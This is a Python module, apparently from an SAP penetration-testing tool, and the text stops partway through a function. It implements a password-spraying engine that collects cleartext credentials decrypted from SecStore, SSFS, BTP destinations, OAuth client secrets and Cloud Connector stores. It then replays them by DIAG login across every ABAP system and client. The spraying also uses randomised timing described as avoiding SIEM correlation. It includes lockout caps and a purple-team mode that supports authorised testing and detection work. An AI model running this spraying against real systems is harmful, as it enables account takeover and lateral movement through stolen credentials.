"""Password-spraying engine (issue #69).

Spray credentials SAPMAP has already decrypted — SecStore (ABAP
RSECTAB), SecStoreFS (Java), SSFS DB_CONNECT, BTP destination service,
OA2C, SCC admin, operator wordlist — across all ABAP systems/clients
on the landscape, looking for password reuse / improper client-copy
hits.  **Reuse-finder, not brute-forcer**: the input pool is tiny
(dozens of distinct passwords, not millions) and the risk tier is
lockout, not performance.

Architecture highlights (see /Users/jorisvandevis/.claude/plans/
zesty-foraging-wombat.md for the full plan):

* Reuses ``sap_default_creds.try_login`` + ``classify_login_response``
  for the DIAG primitive — identical result codes mean the GUI's
  existing hit-presentation drops right in.
* **Session-only pool** — recomputed on demand from the four cred
  stores (``node.credentials``, ``secstore_entries[oauth2_client]``,
  ``btp_subaccounts[*].destinations``, ``scc_nodes[*].credentials``)
  so cleartext never lands in a persistent ``state.password_pool``
  field.  Follows the ``SCCNode.backup_password`` precedent.
* **Hard lockout safety**: cap_per_user ≤ 2 when policy known, ≤ 1
  when unknown.  Landscape-wide ``pwspray_locked_users`` cache bans
  a user on every subsequent target after a single USER_LOCKED
  observation anywhere.  Cross-target circuit breaker halts the
  sweep after N total locks.
* **Cooperative** with the existing ``SAPNode._propagate_locked_out``
  flag (set today by ``sapmap_exploit.py:5769``) — spray reads it
  before every attempt AND sets it on first observed USER_LOCKED, so
  AutoPwn phase4 + TMS propagation + manual LPE all respect each
  other's lockout observations.
* **Short-circuit on first hit** per (sid, client, user) — a 15-pw
  pool for a user that hits at pw #3 makes 3 attempts, not 15, not
  cap.  Dedicated test guards this invariant.
"""
from __future__ import annotations

import hashlib
import json
import logging
import os
import random
import re
import tempfile
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime
from typing import Callable, List, Optional, Sequence, Set, Tuple

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Service / technical users we refuse to spray by default.  Includes the
# obvious platform accounts PLUS the Solution Manager / J2EE / workflow
# service users that routinely appear on every system.  Operators can
# opt them back in per-user with secondary confirms; the pool-aware
# heuristic (any user seen on >N nodes) catches customer-chosen service
# accounts like Z_RFC_SAP that aren't on this list.
DEFAULT_SKIP_USERS: Set[str] = {
    "SAP*", "DDIC",
    "SAPJSF", "SAPCPIC", "TMSADM",
    "SOLMAN_BTC", "SOLMAN_ADMIN", "SMD_RFC", "SMD_ADMIN", "SMD_BI_RFC",
    "CPIC", "EARLYWATCH", "SAPSUPPORT",
    "J2EE_ADMIN", "J2EE_GUEST",
    "SAP_WFRT", "ADSUSER", "WF-BATCH",
    "CSMREG",
}

# Credential kinds that do NOT belong in the DIAG spray pool.
# wd_admin / scc are HTTP-Basic surfaces (different engine); DB
# connect creds are kernel-DB logins, not user accounts.
NON_DIAG_KINDS: Set[str] = {"wd_admin", "scc"}

# Cross-target circuit breaker — halt the whole sweep after this many
# USER_LOCKED observations across all targets.
DEFAULT_MAX_TOTAL_LOCKS_PER_RUN = 3

# Fallback cap when we can't read the target's lockout policy.
UNKNOWN_POLICY_CAP = 1
# Hard ceiling when policy IS known — never exceed this per user per
# target regardless of operator config.
MAX_CAP_PER_USER = 2

# Inter-attempt sleep range (seconds, uniform random).  Avoids a fixed
# 300ms heartbeat that correlates obviously in SIEM; still slow enough
# that failed-logon audit events don't pile up at wire speed.
DEFAULT_SLEEP_RANGE: Tuple[float, float] = (0.3, 0.9)
# Inter-node sleep range (seconds, uniform random).
DEFAULT_INTER_NODE_SLEEP: Tuple[float, float] = (1.0, 2.0)

# Purple-mode DIAG terminal name — a deliberately-identifiable string
# so SOC SIEM correlation rules on the Terminal field can latch onto
# the spray run.  ``SprayConfig.effective_terminal()`` returns this
# when purple_mode is on; the signal rows + the purple_report + the
# engagement report all cite exactly this string so blue-team queries
# are one grep away.  rsau/ip_only=0 is still required on the target
# for the Terminal column to make it into SAL.
PURPLE_SPRAY_TERMINAL = "sapmap-spray-purple"

# SAL audit-class 00 message numbers that a DIAG logon attempt may
# raise, keyed by the result code SAPMAP's try_login classifier
# returns.  Numbers are from SAP's AUT10 catalog; the human-readable
# message column is reproduced for the purple report.  Lists are
# worst-first — some SAP releases emit the fallback number instead
# of the canonical one.
SAL_LOGON_SIGNALS = {
    "SUCCESS": {
        "sal_numbers": ["AU1"],
        "label": "Logon successful",
        "sm21_hint": "User <USER> logged on",
    },
    "PASSWORD_CHANGE": {
        "sal_numbers": ["AU1", "AU6"],
        "label": "Logon with expired password / change prompt",
        "sm21_hint": "User <USER> change password at logon",
    },
    "NO_AUTH_LOGON": {
        "sal_numbers": ["AU7"],
        "label": "No authorization for logon",
        "sm21_hint": "No authorization for logon by user <USER>",
    },
    "WRONG_PASSWORD": {
        "sal_numbers": ["AU2"],
        "label": "Wrong password",
        "sm21_hint": "Wrong password for user <USER>",
    },
    "USER_LOCKED": {
        "sal_numbers": ["AUM"],
        "label": "User <USER> is locked",
        "sm21_hint": "User <USER> is locked (bad logon counter)",
    },
    "USER_NOT_EXIST": {
        "sal_numbers": ["AU6"],
        "label": "Unknown user",
        "sm21_hint": "User <USER> does not exist",
    },
    "SNC_REQUIRED": {
        "sal_numbers": [],
        "label": "SNC enforced — no SAL event (TLS layer refused)",
        "sm21_hint": "",
    },
}


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------

@dataclass
class SprayCandidate:
    """One (username, password) pair harvested from the landscape pool.

    ``source_kind`` tells the operator / report where this came from
    (e.g. ``"credentials"``, ``"secstore_oauth2"``, ``"btp_destination"``,
    ``"scc_admin"``, ``"manual_wordlist"``) and whether this is a
    low-noise 'already-verified-somewhere' cred vs an untested one.
    """
    username: str
    password: str
    source_kind: str = ""          # see docstring
    source_sid: str = ""           # the node this came off, when applicable
    verified_somewhere: bool = False
    # The hint client the source cred was bound to.  Not authoritative —
    # spray walks every target client regardless — but useful for
    # distinguishing 'this cred has an original client of 100 on the
    # source' from 'this cred had no client context (BTP, manual)'.
    source_client: str = ""
    # Count of nodes/entries this exact (user, password) pair appeared
    # on.  Pool collector increments this; the GUI uses it to rank
    # 'top reused' passwords in the preview modal.
    reuse_count: int = 1

    @property
    def key(self) -> Tuple[str, str]:
        """Dedup key — case-insensitive on username (SAP convention)."""
        return (self.username.upper(), self.password)


@dataclass
class SprayTarget:
    """One ABAP target node resolved from the state + a specific
    dispatcher port + the enumerated-or-fallback clients list.
    """
    sid: str
    host: str
    dispatcher_port: int
    clients: List[str] = field(default_factory=list)
    saprouter: str = ""
    system_type: str = ""


@dataclass
class SprayAttempt:
    """One (target, client, user, password) attempt record.  Written to
    ``loot/spray/<run_id>/attempts.jsonl``.  Cleartext password is NOT
    retained in the record — only a sha256 prefix — so the audit trail
    survives share/review without re-leaking the spray pool."""
    ts: str
    sid: str
    host: str
    dispatcher_port: int
    client: str
    user: str
    pw_sha256_prefix: str
    source_kind: str
    source_sid: str
    result: str            # SUCCESS / USER_LOCKED / WRONG_PASSWORD / ...
    detail: str = ""
    terminal: str = ""
    pre_attempt_fail_counter: int = -1
    skipped_reason: str = ""


@dataclass
class SprayConfig:
    """Operator-tunable knobs.  All defaults are the SAFE default — the
    GUI opens with these and the operator loosens them with secondary
    confirms."""
    # Which cred stores to include in the pool
    include_db_connect: bool = False
    include_wd_admin: bool = False
    include_scc: bool = True
    include_cracked_hashes: bool = False     # cracked hashcat creds
    manual_wordlist: List[Tuple[str, str]] = field(default_factory=list)
    # Which service users to opt back IN (default: none).  Each entry
    # must match a username in DEFAULT_SKIP_USERS to take effect —
    # anything else is ignored.
    opt_in_users: Set[str] = field(default_factory=set)
    # Hard cap on per-user attempts per (sid, client).  Floor 1,
    # ceiling MAX_CAP_PER_USER.  Reduced further by compute budget.
    cap_per_user: int = 1
    # Cross-target circuit breaker.
    max_total_locks_per_run: int = DEFAULT_MAX_TOTAL_LOCKS_PER_RUN
    # DIAG terminal name recorded in SM21/SAL Source field (when
    # rsau/ip_only=0 on the target).  Purple mode overrides this with
    # a deliberately identifiable value so SOC correlation rules land.
    terminal: str = "sapscanner"
    # Dry-run — resolve pool + targets + policy probe but open ZERO
    # sockets.  Default True so the first call per session is always
    # a preview; operator must explicitly flip to False with a
    # secondary accept flag.
    dry_run: bool = True
    accept_lockout_risk: bool = False
    # Purple mode — pre-attempt USR02 baseline read + post-attempt
    # signal readback.  Written to loot/spray/<run_id>/purple_report
    # and SAPNode.spray_purple_signals.  Changes default terminal
    # name so SOC rules fire reliably.
    purple_mode: bool = False
    # Early-exit on first SUCCESS/PASSWORD_CHANGE/NO_AUTH_LOGON per
    # (sid, client, user).  Keep True for safety — short-circuit
    # minimises failed-login audit noise per hit.
    early_exit_on_hit: bool = True
    # RFC fallback for NO_DIALOG_USER (system/comm users).  Requires
    # NW RFC SDK available on the SAPMAP host.
    rfc_fallback_for_service_users: bool = True
    # ---- Responsiveness / cancellation (issue #121 follow-up) ----
    # Per-DIAG-attempt timeout (seconds) passed to try_login's socket.
    # Default 3 keeps the median attempt ~1-2s on reachable hosts;
    # worst case on an unreachable host is roughly 3 (connect) + 3
    # (init-recv) + 5 (login-recv w/ internal +2 slack) ≈ 11s.  Was
    # effectively 5+5+7 = 17s before this knob existed, which made
    # STOP look unresponsive on landscapes with any dead host.
    attempt_timeout_s: int = 3
    # Bounded-timeout for probe callbacks that would otherwise block
    # the spray loop on a slow RFC handshake (operator-reported
    # 3-minute stall after the first HIT fired the authority probe
    # against an unreachable co-tenant).
    hit_probe_timeout_s: int = 10
    usr02_probe_timeout_s: int = 10
    # Per-run id — populated by spray_landscape() if left empty.
    run_id: str = ""

    def effective_terminal(self) -> str:
        return "sapmap-spray-purple" if self.purple_mode else self.terminal


@dataclass
class SprayRun:
    """Per-run summary — persisted to ``state.spray_runs``.  Full
    attempt stream lives on disk (keeps .sapmap small)."""
    run_id: str
    started_at: str
    finished_at: str = ""
    config_snapshot: dict = field(default_factory=dict)
    attempts_total: int = 0
    attempts_done: int = 0
    hits: List[dict] = field(default_factory=list)
    locked_users: List[str] = field(default_factory=list)
    skipped: List[dict] = field(default_factory=list)
    aborted: str = ""                        # 'user_stop' / 'cascade_abort' / ''
    loot_path: str = ""
    purple_report_generated: bool = False
    # Purple-mode USR02 baseline (issue #69, PR4).  Marked True only
    # when the baseline + readback RFC_READ_TABLE calls both succeeded
    # on at least one target.  When False, the Defender View modal
    # explains why (UCON block / missing S_TABU_DIS / no verified
    # cred) and renders the expected-signal rows WITHOUT observed
    # deltas — the SOC can still correlate SAL events even if SAPMAP
    # can't readback USR02.
    purple_baseline_available: bool = False
    purple_baseline_error: str = ""

    def to_dict(self) -> dict:
        return asdict(self)


# ---------------------------------------------------------------------------
# Pool collection
# ---------------------------------------------------------------------------

def _is_sapmap_cred(username: str) -> bool:
    return (username or "").upper().startswith("SAPMAP")


def landscape_password_pool(
    state,
    *,
    include_db_connect: bool = False,
    include_wd_admin: bool = False,
    include_scc: bool = True,
    include_cracked_hashes: bool = False,
    manual_wordlist: Optional[Sequence[Tuple[str, str]]] = None,
) -> List[SprayCandidate]:
    """Walk every SAPMAP cred store on the landscape and return a
    deduped, ordered list of ``SprayCandidate``.

    Order (lower priority = tried later):
      1. Verified SAPMAP-family creds (SAP_ALL guaranteed, best signal)
      2. Verified non-SAPMAP creds
      3. Unverified creds (SAPMAP first, others after)

    Dedup is case-insensitive on username (SAP convention) + exact-match
    on password.  The returned ``reuse_count`` reports how many separate
    pool entries contributed to each unique (user, password) key.
    """
    buckets: dict[Tuple[str, str], SprayCandidate] = {}

    def _add(cand: SprayCandidate) -> None:
        if not cand.username or not cand.password:
            return
        k = cand.key
        existing = buckets.get(k)
        if existing is None:
            buckets[k] = cand
            return
        # Dedup: merge metadata, bump reuse_count.  Keep the "best"
        # source_kind/sid pair (verified wins over unverified).
        existing.reuse_count += 1
        if cand.verified_somewhere and not existing.verified_somewhere:
            existing.verified_somewhere = True
            existing.source_kind = cand.source_kind
            existing.source_sid = cand.source_sid
            existing.source_client = cand.source_client

    for sid, node in (state.nodes or {}).items():
        # (1) node.credentials — the primary spray surface.  Filter out
        # the kinds that belong to a different auth channel.
        for cred in (node.credentials or []):
            kind = (getattr(cred, "kind", "") or "").strip()
            if kind in NON_DIAG_KINDS:
                if kind == "wd_admin" and not include_wd_admin:
                    continue
                if kind == "scc":
                    # SCC creds belong in the SCC bucket below.
                    continue
            _add(SprayCandidate(
                username=cred.username,
                password=cred.password,
                source_kind=f"node.credentials{(':' + kind) if kind else ''}",
                source_sid=sid,
                verified_somewhere=bool(getattr(cred, "verified", False)),
                source_client=(cred.client or ""),
            ))
        # (2) OA2C client secrets — stored on secstore_entries with
        # category=='oauth2_client' + ident like
        # /OA2C/CS_<32hex>_<NN> and the plaintext in 'password'.
        # Interesting as a spray cred when the oauth2 client_id string
        # is reusable as a username on nearby systems.
        for entry in (getattr(node, "secstore_entries", None) or []):
            if (entry.get("category") or "").lower() != "oauth2_client":
                continue
            uname = entry.get("username") or entry.get("client_id") or ""
            pw = entry.get("password") or ""
            if not uname or not pw:
                continue
            _add(SprayCandidate(
                username=uname, password=pw,
                source_kind="secstore_oauth2",
                source_sid=sid, verified_somewhere=False))
        # (3) DBCON kernel creds — opt-in only (sapsa/sapsr3 locks the
        # whole DB account out if sprayed carelessly).
        if include_db_connect:
            for edge in (getattr(node, "dbcon_edges", None) or []):
                uname = getattr(edge, "username", "") or ""
                pw = getattr(edge, "password", "") or ""
                if uname and pw:
                    _add(SprayCandidate(
                        username=uname, password=pw,
                        source_kind="dbcon",
                        source_sid=sid, verified_somewhere=False))

    # (4) BTP destination service — cleartext basic-auth creds attached
    # to destinations on subaccounts SAPMAP has pulled.
    for uuid, sub in (getattr(state, "btp_subaccounts", None) or {}).items():
        for dest in (getattr(sub, "destinations", None) or []):
            uname = (dest.user if hasattr(dest, "user")
                     else dest.get("user", "")) or ""
            pw = (dest.password if hasattr(dest, "password")
                  else dest.get("password", "")) or ""
            if uname and pw:
                _add(SprayCandidate(
                    username=uname, password=pw,
                    source_kind="btp_destination",
                    source_sid=uuid, verified_somewhere=False))

    # (5) SCC admin creds — tier them separately: they're not DIAG
    # creds (SCC runs its own Spring auth) but they're frequently
    # reused by sysadmins who manage SCC + the connected ABAP boxes.
    if include_scc:
        for host, scc in (getattr(state, "scc_nodes", None) or {}).items():
            for cred in (getattr(scc, "credentials", None) or []):
                uname = getattr(cred, "username", "") or ""
                pw = getattr(cred, "password", "") or ""
                if uname and pw:
                    _add(SprayCandidate(
                        username=uname, password=pw,
                        source_kind="scc_admin",
                        source_sid=host,
                        verified_somewhere=bool(
                            getattr(cred, "verified", False))))

    # (6) Operator wordlist / cracked-hash intake.  Caller passes a
    # list of (user, pw) tuples; we don't parse hashcat .pot in v1.
    for u, p in (manual_wordlist or []):
        if u and p:
            _add(SprayCandidate(
                username=u, password=p,
                source_kind="manual_wordlist",
                source_sid="", verified_somewhere=False))

    # Order: SAPMAP-verified > verified > SAPMAP-unverified > unverified
    def _rank(c: SprayCandidate) -> Tuple[int, str]:
        if c.verified_somewhere and _is_sapmap_cred(c.username):
            tier = 0
        elif c.verified_somewhere:
            tier = 1
        elif _is_sapmap_cred(c.username):
            tier = 2
        else:
            tier = 3
        return (tier, c.username.upper())

    return sorted(buckets.values(), key=_rank)


# ---------------------------------------------------------------------------
# Target matrix
# ---------------------------------------------------------------------------

def _node_dispatcher_port(node) -> int:
    """Pick the first 32XX dispatcher port we see on any InstanceInfo.
    Returns 0 when the node has no scanned instance (which excludes it
    from spray — we don't guess 3200 blindly)."""
    for inst in (getattr(node, "instances", None) or []):
        for port, svc in (getattr(inst, "ports", {}) or {}).items():
            if not isinstance(port, int):
                continue
            if svc == "dispatcher" or (3200 <= port <= 3299):
                return port
    return 0


def _node_clients(node) -> List[str]:
    """Enumerated clients on the node, as a list of 3-char strings.
    Falls back to ['000', '001'] when the node has no enumerated
    clients — those two always exist on an ABAP install."""
    out: List[str] = []
    for c in (getattr(node, "clients", None) or []):
        nr = (c.get("nr", "") if isinstance(c, dict) else "") or ""
        if nr:
            # Normalise to 3-digit
            try:
                out.append(f"{int(nr):03d}")
            except Exception:
                if len(nr) <= 3:
                    out.append(nr.rjust(3, "0"))
    if not out:
        out = ["000", "001"]
    # dedup preserving order
    seen: set = set()
    dedup: List[str] = []
    for c in out:
        if c not in seen:
            seen.add(c)
            dedup.append(c)
    return dedup


def build_target_matrix(state, scope_filter: Optional[dict] = None) -> dict:
    """Enumerate the spray-eligible target set from the state.

    ``scope_filter`` keys (all optional):
      * ``sids``: list — restrict to these SIDs
      * ``single_sid``: str — convenience, equivalent to ``sids=[sid]``
      * ``include_production``: bool (default False) — opt-in gate; by
        default a node flagged ``is_production=True`` is listed as
        ineligible with reason ``'production'``

    Returns ``{"eligible": [SprayTarget, ...],
               "ineligible": [(SAPNode, reason_str), ...]}``.
    """
    scope_filter = scope_filter or {}
    # Keep as a LIST (not a set) so operator-specified SID order is
    # preserved end-to-end for predictable progress-panel + report
    # output.  Issue #107 planning surfaced the set()-conversion
    # order-loss bug that was invisible as long as only single_sid was
    # exercised.  Membership test is O(k) for k = len(sids); fine for
    # typical N <= ~20 SIDs an operator would spray in one run.
    sids: Optional[List[str]] = None
    if scope_filter.get("single_sid"):
        sids = [scope_filter["single_sid"]]
    elif scope_filter.get("sids"):
        sids = list(scope_filter["sids"])

    include_prod = bool(scope_filter.get("include_production", False))

    eligible: List[SprayTarget] = []
    ineligible: List[Tuple[object, str]] = []
    for sid, node in (state.nodes or {}).items():
        if sids is not None and sid not in sids:
            continue
        # ABAP-only
        stype = (getattr(node, "system_type", "") or "").upper()
        if "ABAP" not in stype:
            ineligible.append((node, "non_abap_stack"))
            continue
        # Must have a known dispatcher port — we don't blind-guess 3200
        port = _node_dispatcher_port(node)
        if not port:
            ineligible.append((node, "no_dispatcher_port"))
            continue
        host = (getattr(node, "ip", "") or "").strip() or \
               (getattr(node, "hostname", "") or "").strip()
        if not host:
            ineligible.append((node, "no_host"))
            continue
        if not include_prod and bool(getattr(node, "is_production", False)):
            ineligible.append((node, "production_opt_in_required"))
            continue
        # Cooperative lockout flag — AutoPwn/TMS may have already set it
        if bool(getattr(node, "_propagate_locked_out", False)):
            ineligible.append((node, "propagate_locked_out_set"))
            continue
        clients = _node_clients(node)
        eligible.append(SprayTarget(
            sid=sid, host=host, dispatcher_port=port,
            clients=clients,
            saprouter=(getattr(node, "saprouter", "") or ""),
            system_type=stype))
    return {"eligible": eligible, "ineligible": ineligible}


# ---------------------------------------------------------------------------
# Attempt budget
# ---------------------------------------------------------------------------

def compute_attempt_budget(
    node,
    operator_cap: int,
    *,
    probe_fn: Optional[Callable[[object], dict]] = None,
) -> dict:
    """Compute the effective per-user attempt cap for ``node``.

    When the node has a verified cred AND ``probe_fn`` is callable, we
    read ``login/fails_to_user_lock`` + USR02 baseline counters via
    the telemetry probe and compute
    ``cap = max(1, fails_to_user_lock - 2 - baseline_counter)``.

    Without a probe (or when the probe fails), we fall back to
    ``UNKNOWN_POLICY_CAP`` (=1) with a warning.  The hard ceiling
    ``MAX_CAP_PER_USER`` (=2) always applies.

    Returns ``{cap_per_user, cap_source, warnings:list,
               fails_to_user_lock, baseline_counter_known}``.
    """
    ceiling = min(max(1, operator_cap), MAX_CAP_PER_USER)
    out = {
        "cap_per_user": UNKNOWN_POLICY_CAP,
        "cap_source": "unknown_policy_default_floor",
        "warnings": [],
        "fails_to_user_lock": None,
        "baseline_counter_known": False,
    }
    if probe_fn is None:
        out["warnings"].append(
            "no probe_fn supplied — using unknown-policy floor of 1")
        return out
    try:
        probe = probe_fn(node) or {}
    except Exception as e:
        out["warnings"].append(f"probe raised: {type(e).__name__}: {e}")
        return out
    if probe.get("status") == "ucon_blocked":
        out["cap_source"] = "ucon_blocked_default_floor"
        out["warnings"].append(
            "UCON blocks the readback FM; cannot read lockout policy")
        return out
    f2l = probe.get("fails_to_user_lock")
    try:
        f2l_int = int(f2l) if f2l is not None else None
    except Exception:
        f2l_int = None
    if f2l_int is None:
        out["warnings"].append(
            "fails_to_user_lock not available; using unknown-policy floor")
        return out
    out["fails_to_user_lock"] = f2l_int
    out["baseline_counter_known"] = bool(probe.get("baseline_counter_known"))
    baseline = int(probe.get("baseline_counter", 0) or 0)
    # Reserve a safety margin of 2 under the kernel's lock threshold
    # AND subtract the user's existing failure counter.  Floor at 1
    # (we always let the operator try at least once).
    cap = max(1, f2l_int - 2 - baseline)
    out["cap_per_user"] = min(cap, ceiling)
    out["cap_source"] = (
        f"policy_known_f2l={f2l_int}_baseline={baseline}_capped_at_{ceiling}")
    return out


# ---------------------------------------------------------------------------
# Spray engine
# ---------------------------------------------------------------------------

def _sha256_prefix(s: str, n: int = 8) -> str:
    return hashlib.sha256((s or "").encode("utf-8")).hexdigest()[:n]


def _jittered_sleep(rng: Tuple[float, float],
                    cancel_check: Optional[Callable[[], bool]] = None) -> None:
    """Sleep for a uniform-random duration in ``rng`` (lo, hi) seconds.

    When ``cancel_check`` is provided, the sleep is sliced into 100ms
    chunks that poll the flag between each — a STOP press during a
    sleep is honoured within ~100ms instead of blocking for the full
    jitter window.  Pre-fix: the raw time.sleep could not be
    interrupted, so STOP latency was floor-bound by the sleep range
    even once the engine's between-iteration cancel_check caught up
    (issue: STOP button no-op during inter-attempt / inter-node
    sleeps on dead-host spray)."""
    lo, hi = rng
    if hi <= 0:
        return
    total = random.uniform(max(0.0, lo), max(lo, hi))
    if cancel_check is None:
        time.sleep(total)
        return
    slice_s = 0.1
    remaining = total
    while remaining > 0:
        if cancel_check():
            return
        step = slice_s if remaining > slice_s else remaining
        time.sleep(step)
        remaining -= step


def _run_with_watchdog(fn, *args, timeout_s: float, default, **kwargs):
    """Run ``fn(*args, **kwargs)`` in a daemon thread with a bounded
    wait.  Returns:

      * ``fn``'s return value if it completes within ``timeout_s``.
      * ``default`` if the thread is still running after ``timeout_s``
        (hard-timeout — caller treats this as "probe gave up").
      * Re-raises any exception ``fn`` raised, so callers that wrap
        the probe in their own ``try/except`` keep seeing the real
        error text (preserves pre-fix behaviour for test asserts
        like ``"S_RFC denied" in note``).

    Used to bound pwspray's probe callbacks (hit-authority probe +
    USR02 baseline/readback) that would otherwise block the whole
    spray loop on a slow RFC handshake.  Operator-reported 3-minute
    stall after the first HIT fired an unbounded authority probe
    against a co-tenant that never completed.

    The thread is daemonised so it doesn't block Python shutdown
    even if the underlying RFC call never returns — the probe's
    socket is leaked (the SDK owns it), but the spray loop proceeds."""
    import threading as _th
    holder = {"value": default, "done": False, "exc": None}

    def _runner():
        try:
            holder["value"] = fn(*args, **kwargs)
            holder["done"] = True
        except BaseException as e:   # noqa: BLE001 — re-raised below
            holder["exc"] = e

    t = _th.Thread(target=_runner, daemon=True)
    t.start()
    t.join(timeout=timeout_s)
    if holder["exc"] is not None:
        raise holder["exc"]
    if holder["done"]:
        return holder["value"]
    # Timed out — caller distinguishes via comparing to `default`.
    return default


def _effective_skip_users(opt_in: Set[str]) -> Set[str]:
    """Default skip-list minus whatever the operator explicitly opted
    back in.  Opt-in is case-insensitive and only applies to users
    that appear in DEFAULT_SKIP_USERS."""
    opt_in_up = {u.upper() for u in (opt_in or set())}
    return {u for u in DEFAULT_SKIP_USERS if u.upper() not in opt_in_up}


def check_sprayed_credentials(
    host: str,
    port: int,
    clients: Sequence[str],
    candidates: Sequence[SprayCandidate],
    *,
    cap_per_user: int = UNKNOWN_POLICY_CAP,
    saprouter: str = "",
    terminal: str = "sapscanner",
    pre_known_locked_users: Optional[Set[str]] = None,
    skip_users: Optional[Set[str]] = None,
    cancel_check: Optional[Callable[[], bool]] = None,
    early_exit_on_hit: bool = True,
    inter_attempt_sleep_range: Tuple[float, float] = DEFAULT_SLEEP_RANGE,
    on_result: Optional[Callable[[dict], None]] = None,
    try_login_fn: Optional[Callable] = None,
    tested_triples: Optional[Set[str]] = None,
    attempt_timeout_s: int = 5,
    on_pre_attempt: Optional[Callable[[SprayCandidate, str, int, int], None]] = None,
) -> List[dict]:
    """Spray ``candidates`` against ``(host, port, each client)`` under
    the given lockout cap.  Generalisation of
    ``sap_default_creds.check_default_credentials``: same result codes,
    same break-on-USER_LOCKED / NO_DIALOG_USER semantics, plus:

      * **Short-circuit** on first SUCCESS/PASSWORD_CHANGE/NO_AUTH_LOGON
        per (client, user) — a 15-password pool for a user that hits
        at #3 makes 3 attempts, not 15, not cap.
      * **Per-user attempt counter** honours ``cap_per_user`` strictly.
      * **Jittered sleep** between attempts (0.3–0.9s uniform default).
      * **Landscape locked-users pre-check** — if ``pre_known_locked_users``
        includes a candidate's user, that user is skipped entirely
        with ``skipped_reason='landscape_locked'``.

    Returns a list of result dicts (one per attempt made or decision
    taken), each shaped like::

        {kind: 'hit'|'miss'|'skipped'|'locked'|'error',
         user, password, client, result, detail, pw_sha256_prefix,
         source_kind, source_sid, skipped_reason?}

    Caller is responsible for persisting these to loot JSONL + emitting
    findings.  Pass ``try_login_fn`` to override the default DIAG
    engine (used by tests to inject a fake).
    """
    if try_login_fn is None:
        # Lazy import — keeps this module importable without a working
        # SAPology / scapy path when tests only exercise pool logic.
        from sap_default_creds import try_login as _real_try_login
        try_login_fn = _real_try_login

    # Import the result-code constants from the shared module so result
    # strings line up with every downstream classifier/UI expectation.
    from sap_default_creds import (
        SUCCESS, PASSWORD_CHANGE, NO_AUTH_LOGON,
        USER_LOCKED, NO_DIALOG_USER,
    )
    HIT_CODES = {SUCCESS, PASSWORD_CHANGE, NO_AUTH_LOGON}

    pre_known_locked_users = {
        u.upper() for u in (pre_known_locked_users or set())}
    # Use ``is None`` as the sentinel so an explicit empty set from the
    # caller disables the skip-list entirely (test harnesses do this to
    # exercise the engine against users that live in DEFAULT_SKIP_USERS).
    if skip_users is None:
        skip_users = _effective_skip_users(set())
    hard_skip = {u.upper() for u in skip_users}
    results: List[dict] = []
    # Per-user attempt counter — resets per (client, user).  Keyed by
    # ``f"{client}|{user.upper()}"``.
    attempts: dict[str, int] = {}
    # Users we've hit (SUCCESS-class) per client — short-circuit flag.
    hit_users_per_client: dict[str, Set[str]] = {c: set() for c in clients}
    # Users we observed USER_LOCKED on — stop trying everywhere this run.
    locked_users: Set[str] = set()
    # Users we observed NO_DIALOG_USER on — stop trying DIAG for them.
    nodialog_users: Set[str] = set()

    def _emit(row: dict) -> None:
        results.append(row)
        if on_result is not None:
            try:
                on_result(row)
            except Exception:
                logger.debug("on_result callback raised", exc_info=True)

    cand_total = len(candidates)
    for client in clients:
        if cancel_check and cancel_check():
            break
        for ci, cand in enumerate(candidates):
            if cancel_check and cancel_check():
                break
            uname_up = cand.username.upper()
            # Skip-list wins.
            if uname_up in {u.upper() for u in hard_skip}:
                _emit({"kind": "skipped", "user": cand.username,
                       "password": cand.password, "client": client,
                       "result": "SKIPPED", "detail": "",
                       "pw_sha256_prefix": _sha256_prefix(cand.password),
                       "source_kind": cand.source_kind,
                       "source_sid": cand.source_sid,
                       "skipped_reason": "skip_list"})
                continue
            if uname_up in pre_known_locked_users or uname_up in locked_users:
                _emit({"kind": "skipped", "user": cand.username,
                       "password": cand.password, "client": client,
                       "result": "SKIPPED", "detail": "",
                       "pw_sha256_prefix": _sha256_prefix(cand.password),
                       "source_kind": cand.source_kind,
                       "source_sid": cand.source_sid,
                       "skipped_reason": "landscape_locked"})
                continue
            if uname_up in nodialog_users:
                # Already observed NO_DIALOG_USER — don't burn more
                # DIAG budget.  RFC fallback (if any) is the caller's
                # job after this function returns.
                continue
            # Short-circuit: user already hit on this client
            if early_exit_on_hit and uname_up in hit_users_per_client.get(
                    client, set()):
                continue
            # Idempotency: skip triples the caller has already fired
            # in a prior invocation (issue #69, PR5).  Protects
            # multi-wave AutoPwn from re-burning the per-user cap on
            # the same (client, user, pw) combination across waves.
            # Full sha256 so a leaked .sapmap can't brute-force the
            # pool from the 32-bit prefix (PR5 review LOW #11).
            if tested_triples is not None:
                _tt_full_sha = hashlib.sha256(
                    cand.password.encode("utf-8")).hexdigest()
                _tt_key = f"{client}|{uname_up}|{_tt_full_sha}"
                if _tt_key in tested_triples:
                    _emit({"kind": "skipped", "user": cand.username,
                           "password": cand.password, "client": client,
                           "result": "SKIPPED", "detail": "",
                           "pw_sha256_prefix": _sha256_prefix(
                               cand.password),
                           "source_kind": cand.source_kind,
                           "source_sid": cand.source_sid,
                           "skipped_reason": "already_tested_triple"})
                    continue
            # Per-user cap on this client
            akey = f"{client}|{uname_up}"
            if attempts.get(akey, 0) >= cap_per_user:
                _emit({"kind": "skipped", "user": cand.username,
                       "password": cand.password, "client": client,
                       "result": "SKIPPED", "detail": "",
                       "pw_sha256_prefix": _sha256_prefix(cand.password),
                       "source_kind": cand.source_kind,
                       "source_sid": cand.source_sid,
                       "skipped_reason": "cap_exhausted"})
                continue

            # The one attempt.
            attempts[akey] = attempts.get(akey, 0) + 1
            # Surface a per-attempt signal BEFORE the (potentially
            # multi-second) DIAG socket call so the GUI's status
            # panel + log tail reflect what the engine is currently
            # doing — the pre-fix engine's silence between HIT lines
            # read as "stuck" even when it was working.
            if on_pre_attempt is not None:
                try:
                    on_pre_attempt(cand, client, ci, cand_total)
                except Exception:
                    logger.debug("on_pre_attempt callback raised",
                                 exc_info=True)
            try:
                result, detail = try_login_fn(
                    host, port, client, cand.username, cand.password,
                    saprouter=saprouter, terminal=terminal,
                    timeout=attempt_timeout_s)
            except TypeError:
                # Older try_login signature w/o keyword args — retry
                # positionally.  Keeps us robust against upstream
                # refactor churn.
                result, detail = try_login_fn(
                    host, port, client, cand.username, cand.password)
            row = {"user": cand.username, "password": cand.password,
                   "client": client, "result": result, "detail": detail,
                   "pw_sha256_prefix": _sha256_prefix(cand.password),
                   "source_kind": cand.source_kind,
                   "source_sid": cand.source_sid}
